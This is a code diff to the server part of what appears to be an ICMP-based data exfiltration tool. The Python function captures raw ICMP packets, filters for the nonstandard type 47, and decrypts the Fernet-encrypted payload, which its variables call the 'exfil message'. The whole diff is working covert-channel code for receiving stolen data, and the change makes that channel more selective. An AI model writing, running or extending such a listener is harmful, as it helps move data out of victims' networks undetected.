@@ -17,16 +17,25 @@ def server():
         if packet is not None:
             print("received packet:" + str(packet) + " from " + str(source))
 
-        # Extract the data from the packet
-        data = packet[28:]
-        encryped_exfil_message = struct.pack(f'{len(packet[28:])}' + ICMP_DATA_FMT, data)
+        # Extract the header from the packet
+        header = packet[20:28]
 
-        # Decrypt the data
-        fernet = Fernet(KEY)
-        decrypted_exfil_message = fernet.decrypt(encryped_exfil_message)
+        # Unpack the header
+        ICMP_TYPE, ICMP_CODE, ICMP_CHECKSUM, ICMP_ID, ICMP_SEQUENCE = struct.unpack(ICMP_HEADER_FMT, header)
 
-        # Print the decrypted data
-        print(decrypted_exfil_message)
+        # Check that the package is of type 47
+        if ICMP_TYPE == 47:
+
+            # Extract the data from the packet
+            data = packet[28:]
+            encryped_exfil_message = struct.pack(f'{len(packet[28:])}' + ICMP_DATA_FMT, data)
+
+            # Decrypt the data
+            fernet = Fernet(KEY)
+            decrypted_exfil_message = fernet.decrypt(encryped_exfil_message)
+
+            # Print the decrypted data
+            print(decrypted_exfil_message)
 
 def main():
     server()
